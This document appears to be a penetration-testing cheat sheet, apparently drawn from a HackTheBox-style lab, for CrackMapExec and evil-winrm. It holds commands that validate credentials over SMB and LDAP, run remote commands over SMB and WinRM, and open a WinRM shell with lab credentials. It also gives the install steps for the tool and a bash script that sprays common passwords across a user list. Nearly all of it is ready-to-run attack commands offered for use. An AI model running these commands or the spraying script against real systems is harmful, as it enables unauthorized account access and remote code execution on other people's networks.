
**user & password verification**

### SMB

```sh
crackmapexec smb 10.10.10.161 -u 'username' -p 'password'
```

### LDAP

```sh
crackmapexec ldap 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

**command execution**

### SMB
```sh
crackmapexec smb 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

### winrm 

```sh
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

**evil winrm**

```sh
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```



# Install CME 6

```bash
https://github.com/byt3bl33d3r/CrackMapExec.git
```

```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
```

```bash
pip3 install .
```
```bash
crackmapexec

# vnc, ldap, ftp
```


## script 

```bash
#!/bin/bash

USERLIST="userlist.txt"  # File containing usernames
PASSWORDS=("Changeme08" "Changeme09" "Changeme07" "Password@123!")  # List of passwords
TARGET="IP"  # Target IP address
OUTPUT_FILE="cme_output.txt"  # File to save results

while read -r user; do
    echo "Testing passwords for user: $user" | tee -a "$OUTPUT_FILE"
    for password in "${PASSWORDS[@]}"; do
        echo "Trying $user:$password" | tee -a "$OUTPUT_FILE"
        crackmapexec smb $TARGET -u "$user" -p "$password" | tee -a "$OUTPUT_FILE"
    done
done < "$USERLIST"
```



